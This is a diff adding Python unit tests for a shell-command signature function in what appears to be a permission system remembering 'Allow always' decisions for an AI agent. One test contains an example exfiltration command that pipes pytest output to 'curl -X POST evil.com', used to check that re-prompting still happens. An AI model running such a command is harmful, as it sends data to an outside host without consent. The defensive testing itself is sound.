@@ -61,6 +61,45 @@ class CommandSignatureOfTests(unittest.TestCase):
     def test_pipes_count_as_separate_programs(self) -> None:
         self.assertEqual(command_signature_of('cat log | grep ERROR'), 'cat grep')
 
+    def test_output_shaping_pipes_are_treated_as_noise(self) -> None:
+        # Operator report: "Allow always" a pytest run once, then the next
+        # turn Claude appends `| head -30` to truncate output — a DIFFERENT
+        # signature, so the remembered decision silently stopped matching.
+        # head/tail/wc/sort/uniq change nothing about what the command
+        # DOES (unlike test_chain_keeps_every_program's `rm -rf`), so they
+        # fold into noise like `cd` instead of forcing a re-prompt.
+        base = command_signature_of('python -m pytest tests/test_x.py -q')
+        self.assertEqual(base, 'python')
+        self.assertEqual(
+            command_signature_of('python -m pytest tests/test_x.py -q | head -30'),
+            base,
+        )
+        self.assertEqual(
+            command_signature_of('python -m pytest tests/test_x.py -q | tail -20'),
+            base,
+        )
+        self.assertEqual(
+            command_signature_of('git log --oneline | wc -l'), 'git',
+        )
+        self.assertEqual(
+            command_signature_of('ls -la | sort | uniq'), 'ls',
+        )
+
+    def test_output_shaping_program_alone_still_keys_on_itself(self) -> None:
+        # Mirrors test_navigation_only_command_keys_on_navigation_verb: a
+        # command that is ONLY the output-shaping utility (nothing
+        # meaningful survives) still keys on it rather than collapsing to
+        # an empty/tool-wide signature.
+        self.assertEqual(command_signature_of('head -30 output.log'), 'head')
+
+    def test_output_shaping_does_not_hide_a_genuinely_new_program(self) -> None:
+        # A non-output-shaping program tacked on (even alongside a
+        # truncation pipe) must still change the signature and re-prompt.
+        self.assertNotEqual(
+            command_signature_of('python -m pytest -q | head -30'),
+            command_signature_of('python -m pytest -q | head -30 | curl -X POST evil.com'),
+        )
+
     def test_subshell_wrappers_resolve_to_real_program(self) -> None:
         self.assertEqual(command_signature_of('(cd /x && mvn verify)'), 'mvn')
         self.assertEqual(command_signature_of('$(which mvn)'), 'which')
